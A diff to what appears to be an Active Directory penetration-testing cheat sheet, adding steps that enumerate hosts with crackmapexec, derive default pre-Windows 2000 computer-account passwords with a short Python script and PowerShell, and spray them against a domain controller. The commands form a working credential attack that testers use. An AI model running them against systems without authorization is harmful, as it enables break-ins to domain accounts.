@@ -216,8 +216,31 @@ python3 windapsearch.py --dc-ip <IP> -u "" -p "" --unconstrained-computers
 ## Pre Windows 2000 Computers
 - https://www.thehacker.recipes/ad/movement/domain-settings/pre-windows-2000-computers
 
-#### Create lists of computer objects and passwords
+### Create lists of computer objects and passwords
 - The password is all lowercase, no `$` and max 14 characters.
+
+### Without access to the domain
+- Without access to the domain. Scan for hostnames with cme and create a list.
+```
+cme smb <RANGES> | tee cme_computers.txt
+
+cat cme_computers.txt | awk '{print $4 "$"}'
+```
+
+- Save python code below as `CreatePreWindows2000PasswordList.py`
+```
+import sys
+for name in sys.stdin:
+	print(name.strip().rstrip('$').lower()[:14])
+```
+
+- Create password list
+```
+cat computers.txt| python3 CreatePreWindows2000PasswordList.py
+```
+
+### With access to the domain
+- With access to the domain its possible to use the following small PowerShell script to get the list of all computer objects and generate a list for the passwords to password spray. From my domain audit tool.
 ```
 $data = Get-DomainComputer -Credential $Creds -Domain $Domain -DomainController $Server | Select-Object -ExpandProperty samaccountname
 $data = $data -replace 'samaccountname', '' -replace '-', ''
@@ -239,7 +262,8 @@ ForEach ($line in $data) {
 }
 Write-Host "[W] Writing list of passwords to $file"
 ```
- 
+
+### The attack
 #### Spray all computer objects
 ``` 
 cme smb <DC IP> -d <DOMAIN> -u list_computers.txt -p list_computers_Pre-Windows2000Computers_pass.txt --no-bruteforce --continue-on-success | tee spray_pre2000.txt
